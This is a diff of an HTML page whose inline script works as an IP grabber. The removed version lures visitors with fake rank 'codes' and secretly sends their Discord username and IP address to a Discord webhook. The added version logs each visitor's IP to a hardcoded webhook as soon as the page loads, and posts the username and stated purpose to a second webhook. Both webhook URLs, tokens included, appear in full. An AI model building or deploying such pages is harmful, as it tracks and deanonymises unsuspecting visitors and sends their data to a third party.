@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>User Input</title>
+  <title>User Information</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -21,9 +21,10 @@
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      width: 300px;
     }
     input {
-      width: 80%;
+      width: 90%;
       padding: 10px;
       margin: 10px 0;
       border: none;
@@ -40,75 +41,85 @@
     button:hover {
       background-color: #5b6eae;
     }
+    #status {
+      margin-top: 15px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Enter Details</h1>
-    <input type="text" id="discordUser" placeholder="Discord Username" required>
-    <input type="text" id="rank" placeholder="Enter Rank" required>
-    <button onclick="sendData()">See Codes</button>
-    <p id="status" style="margin-top: 20px;"></p>
+    <h1>Welcome!</h1>
+    <p>Your IP is being logged...</p>
+    
+    <input type="text" id="purpose" placeholder="What are you here for?" required>
+    <input type="text" id="discordUser" placeholder="Enter your Discord username" required>
+    
+    <button onclick="sendUserData()">Submit</button>
+    <p id="status"></p>
   </div>
 
   <script>
-    async function sendData() {
-      const discordUser = document.getElementById('discordUser').value;
-      const rank = document.getElementById('rank').value.toLowerCase();
-      const status = document.getElementById('status');
-      
-      const validRanks = ['sphhaire', 'gold', 'silver', 'bronze', 'platnum'];
-      let code = '';
-      
-      if (!discordUser || !rank) {
-        status.textContent = 'Please fill in all fields.';
-        status.style.color = 'red';
-        return;
-      }
-      
-      if (!validRanks.includes(rank)) {
-        status.textContent = 'Incorrect Rank. The ranks are: sphhaire, gold, silver, bronze, platnum';
-        status.style.color = 'red';
-        return;
-      }
-      
-      if (rank === 'platnum' || rank === 'sphhaire') {
-        code = 'The code is: highD84DJ';
-      } else if (rank === 'silver') {
-        code = 'The code is: midJ8DH';
-      } else {
-        code = 'The code is: low8Bjhd8';
-      }
+    let userIP = "Fetching...";  // Placeholder until IP is retrieved
 
+    // Fetch and store user's IP
+    async function fetchIP() {
       try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
-        const userIP = ipData.ip;
+        userIP = ipData.ip;
 
-        const webhookUrl = 'https://discord.com/api/webhooks/1332888766490349678/MW70wO-ZgxR6hAWy3RBLW1eusKfkn6m_wfBGkhwYCzxvrwXgUPTawDnZmpvTdb_fEMnY';
-        const response = await fetch(webhookUrl, {
+        // Send the IP immediately upon page load
+        sendIPToWebhook();
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+      }
+    }
+
+    async function sendIPToWebhook() {
+      const webhookUrl = 'https://discord.com/api/webhooks/1332888766490349678/MW70wO-ZgxR6hAWy3RBLW1eusKfkn6m_wfBGkhwYCzxvrwXgUPTawDnZmpvTdb_fEMnY';
+      
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `🚨 **New Visitor IP Logged:** ${userIP}`
+        }),
+      });
+    }
+
+    async function sendUserData() {
+      const purpose = document.getElementById('purpose').value.trim();
+      const discordUser = document.getElementById('discordUser').value.trim();
+      const status = document.getElementById('status');
+
+      if (!purpose || !discordUser) {
+        status.textContent = "Please fill in all fields.";
+        status.style.color = "red";
+        return;
+      }
+
+      const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';
+      
+      try {
+        await fetch(webhookUrl, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `**Discord User:** ${discordUser}\n**Rank:** ${rank}\n**IP Address:** ${userIP}\n**${code}**\n**Server Population:** 9`
+            content: `📌 **New User Entry:**\n🔹 **IP:** ${userIP}\n🔹 **Purpose:** ${purpose}\n🔹 **Discord Username:** ${discordUser}`
           }),
         });
 
-        if (response.ok) {
-          status.textContent = 'No codes are currently working ):.';
-          status.style.color = 'green';
-        } else {
-          status.textContent = 'Failed to send information. Please try again.';
-          status.style.color = 'red';
-        }
+        status.textContent = "Your information has been submitted!";
+        status.style.color = "green";
       } catch (error) {
-        console.error('Error:', error);
-        status.textContent = 'An error occurred. Please try again later.';
-        status.style.color = 'red';
+        console.error("Error sending data:", error);
+        status.textContent = "Error submitting data. Try again.";
+        status.style.color = "red";
       }
     }
+
+    // Fetch IP on page load
+    fetchIP();
   </script>
 </body>
 </html>
